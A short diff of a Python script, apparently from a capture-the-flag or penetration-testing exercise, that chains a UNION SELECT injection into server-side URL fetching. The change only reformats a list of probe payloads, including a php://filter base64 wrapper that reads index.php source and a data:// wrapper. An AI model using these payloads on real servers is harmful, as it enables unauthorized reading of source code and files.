@@ -6,6 +6,7 @@ resulting url is server-side fetched (file_get_contents / urllib).
 UNION SELECT with a crafted URL lets us pick WHAT the server fetches.
 500 => fetch failed (bad path / blocked URL); 200 => it worked.
 """
+
 import time
 import urllib.error
 import urllib.parse
@@ -75,9 +76,11 @@ for c in candidates:
     time.sleep(SLEEP)
 
 print("\n--- body probes (only for 200 hits) ---")
-for c in ["php://filter/convert.base64-encode/resource=index.php",
-          "http://example.com/",
-          "data://text/plain;base64,SEVMTE8="]:
+for c in [
+    "php://filter/convert.base64-encode/resource=index.php",
+    "http://example.com/",
+    "data://text/plain;base64,SEVMTE8=",
+]:
     code, body = probe(c, get_body=True)
     print(f"  {code:>4}  {c}  -> {body[:200]!r}")
     time.sleep(SLEEP)
